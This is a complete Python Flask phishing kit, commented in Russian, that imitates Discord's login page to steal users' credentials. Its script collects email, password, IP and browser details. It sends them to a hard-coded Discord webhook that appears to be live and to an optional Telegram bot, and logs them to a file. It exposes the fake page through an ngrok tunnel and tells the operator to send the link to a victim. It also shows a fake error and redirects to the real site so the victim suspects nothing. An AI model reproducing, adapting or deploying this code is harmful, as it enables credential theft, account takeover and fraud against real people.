#!/usr/bin/env python3
# DISCORD PHISHING V3.0 - ПОЛНАЯ КОПИЯ С АВТОМАТИЧЕСКОЙ ОТПРАВКОЙ
# Установка: pip install flask requests pyngrok

from flask import Flask, request, render_template_string, redirect
import requests
import json
import datetime
import os
import threading
import time

app = Flask(__name__)

# ============================================
# НАСТРОЙКА ПОЛУЧЕНИЯ ДАННЫХ (ЗАПОЛНИ ОБЯЗАТЕЛЬНО!)
# ============================================
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1336186422586716201/2erCI9eFp6GpUQw4OS0TNUqOqwsStkAC-iWbH7dGEW78k2Zk4L-Qyec6r7-vrABJx2rS"  # ВСТАВЬ СЮДА ВЕБХУК
TELEGRAM_BOT_TOKEN = ""  # ИЛИ сюда токен бота
TELEGRAM_CHAT_ID = ""  # ИЛИ сюда chat id

# ============================================
# ТОЧНАЯ КОПИЯ ДИСКОРДА (полностью идентичный дизайн)
# ============================================
DISCORD_LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        /* ПОЛНАЯ КОПИЯ СТИЛЕЙ ДИСКОРДА */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        @font-face {
            font-family: 'Whitney';
            src: url('https://cdn.jsdelivr.net/npm/discord-fonts@1.0.0/whitney-300.woff2') format('woff2');
            font-weight: 300;
        }
        @font-face {
            font-family: 'Whitney';
            src: url('https://cdn.jsdelivr.net/npm/discord-fonts@1.0.0/whitney-400.woff2') format('woff2');
            font-weight: 400;
        }
        @font-face {
            font-family: 'Whitney';
            src: url('https://cdn.jsdelivr.net/npm/discord-fonts@1.0.0/whitney-500.woff2') format('woff2');
            font-weight: 500;
        }
        @font-face {
            font-family: 'Whitney';
            src: url('https://cdn.jsdelivr.net/npm/discord-fonts@1.0.0/whitney-600.woff2') format('woff2');
            font-weight: 600;
        }
        
        body {
            background: #5865F2;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            padding: 0;
        }
        
        .auth-box {
            background: #313338;
            width: 480px;
            border-radius: 8px;
            padding: 32px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .logo svg {
            width: 130px;
            height: 36px;
        }
        
        .title {
            color: #F2F3F5;
            font-size: 24px;
            font-weight: 600;
            line-height: 30px;
            text-align: center;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #B5BAC1;
            font-size: 16px;
            font-weight: 400;
            line-height: 20px;
            text-align: center;
            margin-bottom: 24px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-label {
            color: #B5BAC1;
            font-size: 12px;
            font-weight: 700;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            margin-bottom: 8px;
            display: block;
        }
        
        .input-field {
            background: #1E1F22;
            border: 1px solid #1E1F22;
            border-radius: 4px;
            padding: 12px;
            width: 100%;
            color: #F2F3F5;
            font-size: 16px;
            transition: border-color 0.2s ease;
        }
        
        .input-field:focus {
            border-color: #5865F2;
            outline: none;
        }
        
        .input-field::placeholder {
            color: #5D5F64;
        }
        
        .login-button {
            background: #5865F2;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 14px;
            width: 100%;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s ease;
            margin-bottom: 8px;
        }
        
        .login-button:hover {
            background: #4752C4;
        }
        
        .login-button:disabled {
            background: #4752C4;
            cursor: not-allowed;
            opacity: 0.7;
        }
        
        .qr-link {
            text-align: center;
            margin: 16px 0;
        }
        
        .qr-link a {
            color: #00A8FC;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .qr-link a:hover {
            text-decoration: underline;
        }
        
        .footer-links {
            display: flex;
            justify-content: space-between;
            margin-top: 16px;
            font-size: 14px;
        }
        
        .footer-links a {
            color: #00A8FC;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .need-help {
            color: #B5BAC1;
        }
        
        .register {
            color: #00A8FC;
        }
        
        .error-message {
            background: #F23F42;
            color: white;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }
        
        .loading-spinner {
            display: none;
            text-align: center;
            margin: 10px 0;
        }
        
        .loading-spinner svg {
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Анимации Discord */
        .input-field {
            transition: all 0.2s ease;
        }
        
        .login-button {
            position: relative;
            overflow: hidden;
        }
        
        .login-button::after {
            display: none;
        }
    </style>
</head>
<body>
    <div class="auth-box">
        <!-- Логотип Discord -->
        <div class="logo">
            <svg viewBox="0 0 40 40">
                <circle cx="20" cy="20" r="20" fill="#5865F2"/>
                <path d="M27 16L23.5 16 23.5 14.5C23.5 12.5 21.5 12.5 21.5 12.5L18.5 12.5C18.5 12.5 16.5 12.5 16.5 14.5L16.5 16 13 16 13 27 27 27 27 16zM18 19C18 19 18 19 18 19 17 19 16 18 16 17 16 16 17 15 18 15 19 15 20 16 20 17 20 18 19 19 18 19zM22 19C22 19 22 19 22 19 21 19 20 18 20 17 20 16 21 15 22 15 23 15 24 16 24 17 24 18 23 19 22 19z" fill="white"/>
            </svg>
        </div>
        
        <div class="title">Добро пожаловать!</div>
        <div class="subtitle">Войдите в свой аккаунт Discord</div>
        
        <!-- Сообщение об ошибке (для правдоподобности) -->
        <div class="error-message" id="errorMessage">
            Неправильный логин или пароль. Попробуйте еще раз.
        </div>
        
        <!-- Индикатор загрузки -->
        <div class="loading-spinner" id="loadingSpinner">
            <svg viewBox="0 0 24 24">
                <circle cx="12" cy="12" r="10" stroke="#5865F2" stroke-width="2" fill="none" stroke-dasharray="31.4 31.4" />
            </svg>
        </div>
        
        <form id="loginForm" onsubmit="return false;">
            <div class="input-group">
                <label class="input-label" for="email">ЭЛЕКТРОННАЯ ПОЧТА ИЛИ НОМЕР ТЕЛЕФОНА</label>
                <input type="text" class="input-field" id="email" name="email" placeholder="example@mail.com" autocomplete="off" required>
            </div>
            
            <div class="input-group">
                <label class="input-label" for="password">ПАРОЛЬ</label>
                <input type="password" class="input-field" id="password" name="password" placeholder="············" required>
            </div>
            
            <button type="button" class="login-button" id="loginBtn" onclick="submitLogin()">Войти</button>
        </form>
        
        <div class="qr-link">
            <a href="#">Войти через QR-код</a>
        </div>
        
        <div class="footer-links">
            <span class="need-help">Нужна помощь?</span>
            <a href="#" class="register">Зарегистрироваться</a>
        </div>
    </div>
    
    <script>
        async function submitLogin() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const errorMsg = document.getElementById('errorMessage');
            const spinner = document.getElementById('loadingSpinner');
            
            if (!email || !password) {
                errorMsg.style.display = 'block';
                errorMsg.textContent = 'Пожалуйста, заполните все поля';
                return;
            }
            
            // Блокируем кнопку и показываем загрузку
            loginBtn.disabled = true;
            spinner.style.display = 'block';
            errorMsg.style.display = 'none';
            
            try {
                // Отправляем данные на сервер
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        screenResolution: screen.width + 'x' + screen.height,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timestamp: new Date().toISOString()
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // Перенаправляем на реальный Discord
                    setTimeout(() => {
                        window.location.href = 'https://discord.com/login';
                    }, 1500);
                }
            } catch (error) {
                console.error('Error:', error);
            } finally {
                // Показываем ошибку (для правдоподобности)
                setTimeout(() => {
                    loginBtn.disabled = false;
                    spinner.style.display = 'none';
                    errorMsg.style.display = 'block';
                    document.getElementById('password').value = '';
                }, 1000);
            }
        }
        
        // Добавляем обработку Enter
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitLogin();
            }
        });
    </script>
</body>
</html>
"""

# ============================================
# Функции отправки данных
# ============================================

def send_to_discord(data):
    """Отправка в Discord вебхук"""
    if not DISCORD_WEBHOOK or DISCORD_WEBHOOK == "https://discord.com/api/webhooks/ТВОЙ_ВЕБХУК":
        print("❌ НЕ ЗАПОЛНЕН DISCORD WEBHOOK!")
        return False
    
    # Красивое оформление сообщения
    embed = {
        "embeds": [{
            "title": "🔴 НОВЫЙ ЛОГИН DISCORD",
            "color": 15548997,
            "fields": [
                {
                    "name": "📧 Email/Телефон",
                    "value": f"```{data.get('email', 'N/A')}```",
                    "inline": False
                },
                {
                    "name": "🔑 Пароль",
                    "value": f"```{data.get('password', 'N/A')}```",
                    "inline": False
                },
                {
                    "name": "🌐 IP Адрес",
                    "value": f"```{data.get('ip', 'N/A')}```",
                    "inline": True
                },
                {
                    "name": "🕐 Время",
                    "value": f"```{data.get('timestamp', 'N/A')}```",
                    "inline": True
                },
                {
                    "name": "📱 User Agent",
                    "value": f"```{data.get('userAgent', 'N/A')[:100]}...```",
                    "inline": False
                }
            ],
            "footer": {
                "text": "Discord Phisher v3.0"
            }
        }]
    }
    
    try:
        response = requests.post(DISCORD_WEBHOOK, json=embed)
        if response.status_code == 204:
            print(f"✅ Отправлено в Discord: {data['email']}:{data['password']}")
            return True
        else:
            print(f"❌ Ошибка Discord: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Ошибка отправки в Discord: {e}")
        return False

def send_to_telegram(data):
    """Отправка в Telegram"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    
    message = f"""
🔴 **НОВЫЙ ЛОГИН DISCORD**

📧 **Email/Телефон:** `{data.get('email', 'N/A')}`
🔑 **Пароль:** `{data.get('password', 'N/A')}`
🌐 **IP:** `{data.get('ip', 'N/A')}`
🕐 **Время:** `{data.get('timestamp', 'N/A')}`

📱 **User Agent:** `{data.get('userAgent', 'N/A')[:200]}`
    """
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        })
        if response.status_code == 200:
            print(f"✅ Отправлено в Telegram: {data['email']}:{data['password']}")
            return True
    except:
        pass
    return False

def save_to_file(data):
    """Сохранение в файл"""
    with open('discord_logs.txt', 'a', encoding='utf-8') as f:
        f.write(json.dumps(data, ensure_ascii=False) + '\n')
    print(f"📁 Сохранено в файл: {data['email']}:{data['password']}")

# ============================================
# Flask routes
# ============================================

@app.route('/')
def index():
    """Главная страница - точная копия Discord"""
    return render_template_string(DISCORD_LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    """Получение данных логина"""
    data = request.json
    
    # Добавляем IP
    if request.headers.get('X-Forwarded-For'):
        data['ip'] = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        data['ip'] = request.remote_addr
    
    # Добавляем время
    if 'timestamp' not in data:
        data['timestamp'] = str(datetime.datetime.now())
    
    # Выводим в консоль
    print("\n" + "="*50)
    print("🔴 ПОЛУЧЕНЫ ДАННЫЕ:")
    print(f"📧 Email: {data.get('email')}")
    print(f"🔑 Password: {data.get('password')}")
    print(f"🌐 IP: {data.get('ip')}")
    print(f"🕐 Time: {data.get('timestamp')}")
    print("="*50 + "\n")
    
    # Сохраняем везде
    save_to_file(data)
    send_to_discord(data)
    send_to_telegram(data)
    
    return {"success": True}

@app.route('/login.css')
def css():
    """Пустой css для обхода проверок"""
    return ""

@app.route('/assets/<path:path>')
def assets(path):
    """Заглушка для ассетов"""
    return ""

# ============================================
# Автоматическое получение публичной ссылки
# ============================================

def get_public_url():
    """Получение публичного URL через ngrok"""
    try:
        from pyngrok import ngrok
        
        # Открываем туннель
        public_url = ngrok.connect(5000).public_url
        print(f"\n✅ ПУБЛИЧНАЯ ССЫЛКА: {public_url}")
        print(f"📌 Отправь эту ссылку жертве: {public_url}")
        
        # Отправляем ссылку себе в Discord
        if DISCORD_WEBHOOK:
            requests.post(DISCORD_WEBHOOK, json={
                "content": f"✅ **ФИШИНГ ССЫЛКА ГОТОВА:**\n{public_url}"
            })
        
        return public_url
    except Exception as e:
        print(f"\n⚠️ Не удалось получить публичную ссылку: {e}")
        print("📌 Локальная ссылка: http://127.0.0.1:5000")
        print("📌 Для публичного доступа:")
        print("   1. Установи ngrok: pip install pyngrok")
        print("   2. Или используй localhost.run: ssh -R 80:localhost:5000 localhost.run")
        return "http://127.0.0.1:5000"

# ============================================
# Запуск
# ============================================

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════╗
    ║     DISCORD PHISHING V3.0 - ТОЧНАЯ КОПИЯ            ║
    ║     ГОТОВО К ЗАПУСКУ                                 ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    # Проверка настроек
    if DISCORD_WEBHOOK and DISCORD_WEBHOOK != "https://discord.com/api/webhooks/ТВОЙ_ВЕБХУК":
        print("✅ Discord webhook настроен")
    else:
        print("⚠️ Discord webhook не настроен - данные будут только в файл")
    
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        print("✅ Telegram настроен")
    
    print("\n" + "="*60)
    print("🚀 ЗАПУСК СЕРВЕРА...")
    print("📁 Логи будут сохраняться в discord_logs.txt")
    print("="*60 + "\n")
    
    # Запускаем в отдельном потоке получение публичной ссылки
    threading.Thread(target=get_public_url, daemon=True).start()
    
    # Запускаем сервер
    app.run(host='0.0.0.0', port=5000, debug=False)
